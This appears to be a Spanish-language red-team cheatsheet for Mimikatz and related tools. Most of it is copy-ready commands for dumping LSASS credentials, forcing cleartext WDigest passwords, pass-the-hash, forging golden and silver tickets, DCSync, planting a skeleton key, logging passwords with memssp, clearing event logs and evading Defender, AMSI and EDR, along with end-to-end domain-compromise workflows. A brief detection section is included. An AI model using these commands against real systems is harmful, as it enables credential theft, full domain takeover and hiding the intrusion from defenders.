---
aliases:
  - Mimikatz
  - Mimikatz Cheatsheet
  - mimikatz.exe
  - kiwi
tags:
  - type/tool
  - tool/mimikatz
  - technique/credential-access
  - technique/lateral-movement
  - env/windows
  - env/active-directory
  - cred/ntlm
  - cred/kerberos
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Credential Access]]'
tertiary categories:
  - '[[LSASS Dumping]]'
  - '[[Kerberos]]'
kind: Tool
linked:
  - '[[LSASS Dumping - Mimikatz Methods]]'
  - '[[Pass-the-Hash]]'
  - '[[Pass-the-Ticket]]'
  - '[[Golden Ticket]]'
  - '[[Silver Ticket]]'
  - '[[DCSync]]'
  - '[[Skeleton Key]]'
  - '[[Rubeus]]'
  - '[[Impacket Toolkit]]'
  - '[[evil-winrm]]'
---

# Mimikatz

***

## Overview

Toolkit C de Benjamin Delpy (gentilkiwi). Dump de credenciales LSASS, manipulación Kerberos, DPAPI, SAM/LSA, ataques skeleton key + DCSync. Ejecutable Windows (`mimikatz.exe`), pero existen wrappers:

- **kiwi** — extensión meterpreter (`load kiwi` en [[Impacket Toolkit|Metasploit]]).
- **pypykatz** — reimplementación Python pura, parse offline de LSASS dumps (no requiere Windows).
- **SafetyKatz / SharpKatz** — variantes .NET para ejecución in-memory via [[Rubeus]]/Cobalt.
- **DumpertCS / nanodump** — solo dump LSASS, parse offline con pypykatz/mimikatz.

> Regla: Mimikatz necesita **SeDebugPrivilege** + integridad alta (admin local) para tocar LSASS. Para SAM/LSA hives: **SYSTEM**. Defender lo flagea por signature — usar bypass AMSI/AV o variantes .NET in-memory.

***

## Setup + carga

### Binario directo

```cmd
mimikatz.exe
# o ejecutar con redirección de comandos
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "log dump.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### In-memory desde evil-winrm

```powershell
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Meterpreter (kiwi)

```bash
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

### pypykatz offline (Linux attacker)

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp                  # parse LSASS dump
pypykatz registry --sam SAM SYSTEM               # parse SAM offline
pypykatz lsa --json minidump lsass.dmp > out.json
```

***

## Privilegios

```
mimikatz # privilege::debug
Privilege '20' OK
```

Si falla → no sos admin o token sin SeDebugPrivilege. Solución: `runas` con admin, UAC bypass, o token impersonation.

```
mimikatz # token::elevate                        # toma SYSTEM si admin
mimikatz # token::list
mimikatz # token::run /user:DOMAIN\admin cmd.exe
```

***

## Módulo `sekurlsa` — LSASS dump

Lee proceso LSASS en memoria. Necesita admin + SeDebugPrivilege.

```
mimikatz # sekurlsa::logonpasswords                    # default: NT, SHA1, DPAPI, plaintext (WDigest)
mimikatz # sekurlsa::logonpasswords full                # con WDigest forzado si UseLogonCredential=1
mimikatz # sekurlsa::wdigest                            # solo WDigest (cleartext si OS <2012R2 o reg flip)
mimikatz # sekurlsa::msv                                # solo NT/LM hashes (MSV1_0)
mimikatz # sekurlsa::kerberos                           # tickets + claves Kerberos
mimikatz # sekurlsa::tspkg                              # TSPKG (RDP)
mimikatz # sekurlsa::ssp                                # SSP creds (paquetes auth third-party)
mimikatz # sekurlsa::livessp                            # LiveSSP (Live ID)
mimikatz # sekurlsa::credman                            # Credential Manager
mimikatz # sekurlsa::cloudap                            # CloudAP / AzureAD PRT
mimikatz # sekurlsa::dpapi                              # DPAPI master keys cacheadas
```

### Forzar WDigest cleartext (Win 8.1+ / 2012 R2+)

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Esperar que un user/admin se loguee de nuevo
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest
```

### Pass-the-Hash

```
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NThash> /run:cmd.exe
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes256> /run:cmd.exe
```

Spawnea proceso con creds inyectadas en LSASS (sin reset, en token actual). Ver [[Pass-the-Hash]].

### Pass-the-Ticket

```
mimikatz # kerberos::list
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # kerberos::ptt C:\tickets\
mimikatz # kerberos::purge
```

Ver [[Pass-the-Ticket]].

### Pass-the-Key / OverPass-the-Hash

```
mimikatz # sekurlsa::pth /user:alice /domain:domain.local /aes256:<key> /run:cmd.exe
```

Inyecta clave AES256 en lugar de NT hash. Spawnea proceso que pide TGT como `alice` usando esa clave → OPSEC mejor que PtH (sin RC4 etype 0x17 telling).

### Listar tickets en memoria

```
mimikatz # sekurlsa::tickets /export                    # exporta a .kirbi en CWD
```

### Minidump offline workflow

```cmd
:: En target — dump LSASS (taskmgr / procdump / comsvcs.dll / nanodump)
C:\> tasklist /svc | findstr lsass
C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
:: O con procdump (SysInternals — firmado, menos detectable que mimikatz)
C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

En attacker:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

O pypykatz directo:

```bash
pypykatz lsa minidump lsass.dmp
```

Ver [[LSASS Dumping - Mimikatz Methods]] / [[LSASS Dumping - Modern EDR Evasion]].

***

## Módulo `lsadump` — SAM / LSA / NTDS

Necesita SYSTEM (no solo admin) para tocar SAM/LSA.

### SAM (local accounts)

```
mimikatz # token::elevate                              # to SYSTEM
mimikatz # lsadump::sam
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM        # offline desde hives
mimikatz # lsadump::cache                              # MSCache v2 (domain creds cached)
mimikatz # lsadump::cache /system:SYSTEM /security:SECURITY     # offline
```

MSCache v2 → hashcat `-m 2100`. Lento de crackear pero a veces único path.

### LSA secrets

```
mimikatz # lsadump::secrets
mimikatz # lsadump::secrets /system:SYSTEM /security:SECURITY
```

Saca service account passwords, autologon, RDP saved creds. Críticos: `_SC_<servicename>`, `DefaultPassword`, `DPAPI_SYSTEM`.

### DCSync (replication ACL)

```
mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt
mimikatz # lsadump::dcsync /user:DOMAIN\Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv     # dump completo
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt /authuser:alice /authdomain:domain.local /authpassword:Passw0rd
```

Requiere ACE `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (default: DAs, EAs, Domain Controllers). Ver [[DCSync]].

### NTDS offline

```
mimikatz # lsadump::lsa /inject /name:krbtgt                  # inject method (en DC)
mimikatz # lsadump::lsa /patch                                # patch method
```

Para `ntds.dit` extraído offline: usar [[Impacket Toolkit]] `secretsdump -ntds`.

### Trust keys

```
mimikatz # lsadump::trust /patch
mimikatz # lsadump::dcsync /domain:child.domain.local /user:DOMAIN$
```

Trust keys → forging inter-domain Golden Tickets (cross-forest).

***

## Módulo `kerberos` — ticket forge / ops

### Golden Ticket

```
mimikatz # kerberos::golden \
  /user:Administrator \
  /domain:domain.local \
  /sid:S-1-5-21-... \
  /krbtgt:<krbtgt_NT> \
  /ptt

# AES256 (más OPSEC, no RC4)
mimikatz # kerberos::golden \
  /user:Administrator /domain:domain.local /sid:<dsid> \
  /aes256:<krbtgt_aes256> /ptt

# Con SID History (cross-forest)
mimikatz # kerberos::golden \
  /user:Administrator /domain:a.local /sid:<A_SID> \
  /krbtgt:<A_krbtgt_NT> /sids:<B_EA_SID> /ptt

# Save a archivo en lugar de PtT
mimikatz # kerberos::golden /user:Admin /domain:dom /sid:X /krbtgt:Y /ticket:golden.kirbi
```

Ver [[Golden Ticket]].

### Silver Ticket

```
mimikatz # kerberos::golden \
  /user:Administrator /domain:domain.local /sid:<dsid> \
  /target:victim.domain.local /service:CIFS \
  /rc4:<victim_machine_NT> /ptt
```

`/target` + `/service` definen el SPN. Usa NT hash de la **cuenta del servicio** (machine account `victim$`). Ver [[Silver Ticket]].

### PtT / list / purge

```
mimikatz # kerberos::list
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # kerberos::purge
mimikatz # kerberos::clist                                    # tickets del proceso actual
```

### Skeleton Key (post-DC compromise)

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

Inyecta en LSASS del DC un master password ("mimikatz") válido para cualquier user. Persiste hasta reboot del DC. Ver [[Skeleton Key]].

***

## Módulo `dpapi`

Decrypt blobs DPAPI (RDP saved creds, Chrome cookies, Wi-Fi, Vault).

### Master keys

```
mimikatz # dpapi::masterkey /in:"C:\Users\alice\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /sid:<SID> /password:<plain>
mimikatz # dpapi::masterkey /in:<masterkey_file> /pvk:<domain_DPAPI_backup_key.pvk>
```

Backup key del DC (decifra todo masterkey de usuario en dominio):

```
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
# o
mimikatz # lsadump::secrets                                   # contiene DPAPI_SYSTEM
```

### Credential blobs

```
mimikatz # dpapi::cred /in:"C:\Users\alice\AppData\Roaming\Microsoft\Credentials\<file>" /masterkey:<masterkey>
mimikatz # dpapi::vault /in:"C:\Users\alice\AppData\Local\Microsoft\Vault\<GUID>"
mimikatz # dpapi::chrome /in:"C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:<masterkey>
```

### Wi-Fi / WLAN

```
mimikatz # dpapi::wlan /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<GUID>\<profile>.xml"
```

***

## Módulo `crypto`

```
mimikatz # crypto::certificates /export                       # exportar certs sistema (My, CA)
mimikatz # crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /export
mimikatz # crypto::capi                                       # CryptoAPI providers
mimikatz # crypto::cng                                        # CNG providers
mimikatz # crypto::scauth                                     # smart card auth
mimikatz # crypto::keys /export                               # exportar keys protegidas (extractable=0 bypass)
```

Útil para extraer certs cliente / cert ADCS no exportables (`/export` + `crypto::keys` bypass de `extractable=FALSE`).

***

## Módulo `vault`

```
mimikatz # vault::cred
mimikatz # vault::list
```

Equivalente legacy de DPAPI Vault.

***

## Módulo `ts` — Terminal Services

```
mimikatz # ts::sessions                                       # lista sesiones RDP
mimikatz # ts::multirdp                                       # parche en runtime para múltiples sesiones RDP
mimikatz # ts::remote /id:2                                   # take-over sesión RDP de otro user
```

***

## Módulo `misc`

```
mimikatz # misc::skeleton                                     # ver § Skeleton Key
mimikatz # misc::cmd                                          # cmd.exe en SYSTEM (token actual)
mimikatz # misc::regedit                                      # idem regedit
mimikatz # misc::memssp                                       # log de creds nuevos en C:\Windows\System32\mimilsa.log
mimikatz # misc::detours                                      # detour de funciones (research)
mimikatz # misc::ncroutemon                                   # ver "NCrypt" providers
```

### memssp (passive credential logger)

Inyecta SSP en LSASS. Cada login subsiguiente loguea user+password en cleartext a `C:\Windows\System32\mimilsa.log`. Persiste hasta reboot.

***

## Módulo `privilege`

```
mimikatz # privilege::debug
mimikatz # privilege::driver                                  # SeLoadDriverPrivilege
mimikatz # privilege::backup                                  # SeBackupPrivilege (lee SAM/SYSTEM hives)
mimikatz # privilege::restore                                 # SeRestorePrivilege
```

***

## Módulo `event`

```
mimikatz # event::drop                                        # drop futuros events (clear-eventlog mejor)
mimikatz # event::clear                                       # clear log actual
```

***

## Variantes / wrappers in-memory

| Tool | Plataforma | Ventaja |
|---|---|---|
| **mimikatz.exe** | Windows | Funcionalidad completa, signature-known. |
| **Invoke-Mimikatz.ps1** | PowerShell | Carga in-memory via IEX — AMSI flagged. |
| **SafetyKatz** | .NET | LSASS dump via overload + parse offline. |
| **SharpKatz** | .NET | Reescritura C# de funciones core. |
| **pypykatz** | Python | Parsea offline dumps, no necesita Windows. |
| **kiwi** | Meterpreter | `load kiwi` + `creds_all`. |
| **nanodump** | C / BOF | Solo dump LSASS (silent → parsear con pypykatz). |
| **Dumpert** | C | Dump LSASS via API unhook + syscalls directos. |
| **ProcDump (Sysinternals)** | Firmado MS | Dump LSASS sin Mimikatz signature — `procdump -ma lsass.exe`. |
| **comsvcs.dll MiniDump** | LOLBin | `rundll32 comsvcs.dll, MiniDump <pid> dump full` — no extra binary. |

Para EDR moderno: combinar dump silencioso (Dumpert / nanodump / comsvcs) + parse offline con pypykatz. Ver [[LSASS Dumping - Modern EDR Evasion]].

***

## Workflow típico Windows comprometido

```
1. UAC bypass / privesc → admin local
2. mimikatz.exe (o variant)
3. privilege::debug
4. token::elevate                            (SYSTEM)
5. sekurlsa::logonpasswords full             (NT + plaintext WDigest si flag)
6. sekurlsa::tickets /export                 (kirbi de todos los users logueados)
7. lsadump::sam                              (local accounts)
8. lsadump::cache                            (MSCache de DAs cacheados)
9. lsadump::secrets                          (LSA — service account passes)
```

## Workflow DC compromise

```
1. Admin en DC (DA o equivalente)
2. mimikatz.exe
3. privilege::debug
4. lsadump::dcsync /user:krbtgt              (krbtgt hash → Golden Ticket)
5. lsadump::dcsync /user:Administrator
6. lsadump::dcsync /domain:dom.local /all    (full domain dump, NTDS-style)
7. kerberos::golden /user:Admin /domain:dom /sid:X /krbtgt:Y /ptt
```

## Workflow stealth (EDR-aware)

```
1. nanodump -p $(get-process lsass).id -w C:\Windows\Temp\dump.bin
2. Exfil dump.bin
3. pypykatz lsa minidump dump.bin                  (offline en attacker)
```

***

## OPSEC

- **Defender + AMSI** detecta `mimikatz.exe` por hash/string. Renombrar no basta — signatures cubren strings internos.
- WDigest cleartext requiere reg flip + re-login → genera Event 4657 (registry mod).
- `sekurlsa::logonpasswords` abre handle a LSASS con `0x1010` rights → flagueado por Sysmon Event 10 / Defender ASR.
- DCSync genera Event 4662 con `Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) — signal típica.
- Golden Ticket con RC4 (sin AES) → Event 4769 `Ticket Encryption Type: 0x17` cuando otros tickets son AES.
- Skeleton Key sobre DC → masster password `mimikatz` con encryption type 0x17 + flagged por Microsoft ATA.
- Para reducir signal: variantes .NET (`SharpKatz`), dump offline (nanodump/Dumpert), parse pypykatz fuera del host.

***

## Detecciones (blue team)

- Sysmon EID 10 con `TargetImage=lsass.exe` + `GrantedAccess=0x1010/0x1410/0x1438`.
- 4662 con GUID DS-Replication-Get-Changes desde principal no-DC.
- 4769 con etype 0x17 en entornos AES-only.
- 4624 con LogonProcessName=`Advapi32` y patrón skeleton key (any-password).
- ASR rule `Block credential stealing from the Windows local security authority subsystem (lsass.exe)` (GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`).
- LSA Protection (`RunAsPPL=1`) — bloquea handles a LSASS desde non-PPL. Bypass: BYOVD (drivers vulnerables) o KDU.

***

## Referencias

- Repo: https://github.com/gentilkiwi/mimikatz
- Wiki: https://github.com/gentilkiwi/mimikatz/wiki
- pypykatz: https://github.com/skelsec/pypykatz
- SharpKatz: https://github.com/b4rtik/SharpKatz
- ADSecurity (Sean Metcalf) — análisis profundo: https://adsecurity.org/?page_id=1821
